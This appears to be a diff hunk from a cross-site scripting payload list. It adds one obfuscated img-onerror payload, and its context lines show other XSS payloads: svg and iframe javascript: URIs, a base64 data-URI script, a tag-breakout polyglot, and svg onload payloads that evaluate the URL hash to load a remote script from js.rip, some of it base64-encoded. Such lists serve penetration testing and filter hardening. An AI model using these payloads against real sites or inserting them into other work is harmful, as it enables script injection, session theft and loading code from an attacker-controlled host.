@@ -10,6 +10,7 @@ abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3
 <svg><foreignObject width="100%" height="100%">     <body> <iframe src='javascript:confirm(10)'></iframe>     </body>   </foreignObject> </svg>
 <script>var a=document.createElement("a");a.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";a.click();</script>
 jaVasCript:/--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[/[]/+alert(1)//'>"'alert(1)
+<img/src/onerror​=alert&#xFEFF;(1)>
 <svg/onload=eval(location.hash.slice(1))>#with(document)body.appendChild(createElement('script')).src='//js.rip/bugbounty'
 <svg/onload=eval(location.hash.slice(1))>#with(document)body.appendChild(createElement(/script/.source)).src=atob(/Ly9qcy5yaXAvYnVnYm91bnR5/.source)
 <svg/onload=eval(atob(location.hash.slice(1)))>#d2l0aChkb2N1bWVudClib2R5LmFwcGVuZENoaWxkKGNyZWF0ZUVsZW1lbnQoL3NjcmlwdC8uc291cmNlKSkuc3JjPWF0b2IoL0x5OXFjeTV5YVhBdlluVm5ZbTkxYm5SNS8uc291cmNlKQ==
